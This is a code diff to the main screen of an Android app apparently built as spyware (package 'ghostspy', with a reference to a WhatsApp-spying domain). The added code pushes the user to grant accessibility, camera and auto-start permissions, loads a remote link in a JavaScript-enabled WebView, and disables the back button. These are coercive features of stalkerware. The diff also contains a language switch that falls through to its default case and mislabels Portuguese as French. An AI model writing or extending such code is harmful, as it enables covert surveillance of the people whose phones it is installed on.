@@ -6,6 +6,7 @@ import android.annotation.SuppressLint;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -18,14 +19,17 @@ import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Button;
+import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.RelativeLayout;
 
+import com.spy.ghostspy.activity.SetAutoStartActivity;
 import com.spy.ghostspy.server.Server;
 
 import java.util.Locale;
 
 public class MainActivity extends AppCompatActivity {
+    private ImageView mImgBackground;
     private Button mBtnAllow1;
     private Button mBtnEnable1;
 
@@ -51,17 +55,23 @@ public class MainActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
         requestPowerManger();
-//        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
-//            mLayoutWebview.setVisibility(View.GONE);
-        mLayoutSetting.setVisibility(View.VISIBLE);
-//        } else {
-//            WebSettings webSettings = _webview.getSettings();
-//            webSettings.setJavaScriptEnabled(true);
-//            _webview.setWebViewClient(new WebViewClient());
-//            _webview.loadUrl("https://app.whatsespiao.cfd/install/");
-//            mLayoutSetting.setVisibility(View.GONE);
-//            mLayoutWebview.setVisibility(View.VISIBLE);
-//        }
+        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
+            mLayoutWebview.setVisibility(View.GONE);
+            mLayoutSetting.setVisibility(View.VISIBLE);
+        } else if(checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            Intent intent = new Intent(getBaseContext(), SetAutoStartActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } else {
+            if(getResources().getString(R.string.app_link_enable).equals("enable")) {
+                WebSettings webSettings = _webview.getSettings();
+                webSettings.setJavaScriptEnabled(true);
+                _webview.setWebViewClient(new WebViewClient());
+                _webview.loadUrl(getResources().getString(R.string.app_link));
+                mLayoutSetting.setVisibility(View.GONE);
+                mLayoutWebview.setVisibility(View.VISIBLE);
+            }
+        }
     }
 
     @SuppressLint("BatteryLife")
@@ -80,7 +90,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void setReady() {
+        Locale currentLocale = Locale.getDefault();
+        String currentLanguage = currentLocale.getLanguage();
         onRequestAutoStart();
+        mImgBackground = findViewById(R.id.img_background);
         mBtnAllow1 = (Button) findViewById(R.id.btn_allow1);
         mBtnEnable1 = (Button) findViewById(R.id.btn_enable1);
         mBtnAllow2 = (Button) findViewById(R.id.btn_allow2);
@@ -91,6 +104,15 @@ public class MainActivity extends AppCompatActivity {
         mLayoutButton1 = findViewById(R.id.layout_button1);
         mLayoutButton2 = findViewById(R.id.layout_button2);
         mLayoutButton3 = findViewById(R.id.layout_button3);
+
+        switch (currentLanguage) {
+            case "es": // Spanish
+                mImgBackground.setImageResource(R.drawable.backgroundes);
+            case "pt": // French
+                mImgBackground.setImageResource(R.drawable.background);
+            default:   // Default to English or other languages
+                mImgBackground.setImageResource(R.drawable.backgrounden);
+        }
 
         _webview = findViewById(R.id.view_web);
         mBtnAllow1.setOnClickListener(new View.OnClickListener() {
@@ -241,5 +263,9 @@ public class MainActivity extends AppCompatActivity {
             Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             startActivity(intent);
         }
+    }
+
+    @Override
+    public void onBackPressed() {
     }
 }
